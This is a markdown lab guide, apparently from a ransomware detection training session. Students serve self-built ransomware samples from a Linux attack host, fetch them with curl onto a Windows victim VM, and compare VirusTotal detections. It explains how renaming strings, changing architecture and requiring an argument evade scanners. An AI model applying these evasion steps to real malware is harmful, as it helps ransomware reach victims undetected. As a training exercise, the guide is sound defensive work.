# Detection

## Host the "evil" files.

1. First record your IP address on the eth0 interface. `ip addr`
2. Now change directory into the notransomware directory.
3. Run the following command to serve the files for download.
`python3 -m httpserver`

## Update Lab Files
1. Open a administrative command prompt by clicking the search icon (magnifying glass) in the bottom left.
2. Type cmd and click on the command prompt desktop app icon when it appears.
3. Change directories to the lab files on the desktop. `cd c:\Users\Administrator\Desktop\rsac21-ransom`
4. Update the files from the git repo.  `git pull`

## Download the "evil" files.

1. Switch to the "WIN-VICTIM-HOST-#" by pressing **ctrl+shift+alt**.
2. Do some pre-flight checks, you can access all the required programs by clicking the search bar in the bottom left and typing their respective names. When they appear in the start menu results, double click them.
- Is a folder on the desktop called? (If not, launch a command prompt and run `git clone `)
- Is firefox installed? (If not, launch a command prompt and run `choco install firefox`)
3. Open a command prompt. 
4. Run the following command with my new favorite living off the land binary for dowloading remote files. 
`curl http://172.31.24.<last octet of your linux attack host>:8000/test1.exe -o test1.exe`
5. Once you have this worked out, download all theo ther files you created on the linux attack host just changing the file names.
6. This is your first detection example...no alerts from windows defender.

## What does virust total have to say about all this?

1. Open firefox and browse to virus total.  www.virustotal.com
2. Click the **choose a file** optiont to upload for analysis.
3. Browse to C:\Users\Administrator and select test1.exe.
4. Wait for the analysis. It will look something like this, but may have changed with all of the concurent uploads of a similar file.
> Remember this is was the file that you saved as is and compiled in the amd64 architecture. Having just 3 detections for what will effectively encrypt files in your homedrive and attempt to connect to a server, while dropping a key and ransom note is pretty scray in itself.
5. Now Click the upload button in the top left beside the search bar and upload the second sample test2.exe
> This was the sample you simply replaced all occurances of the word encrypt with another word. This now comes back with only 2 detections. Putting on show case that changing common words and text associated with malware inside binaries will trick a number of detections in iteslef. Not to mention this changes zero function of the binary while completely changing the hash.
6. Finally, upload the 32bit version of this sample. Same sample as before, but compliled for the more commonly execuable 32bit architecture.
> By nature of the architecture you will see many more detections now, many of the static and behavioral analysis tools are tuned toward 32bit binaires and instructions.
7. All that's great but now upload the final sample where you added the argument requirement for it to run. Test232-args.exe.
> You will notice nearly all the detections go away now, even in the 32bit architecture. All of that work spent on creating different types of anti analysis techiniques and simply adding an argument requirement will fool nearly every auto analysis capability out there, making the detection solely reliant on strings.

Let's return to talk about what just happened and get ready to move on to live reponse.


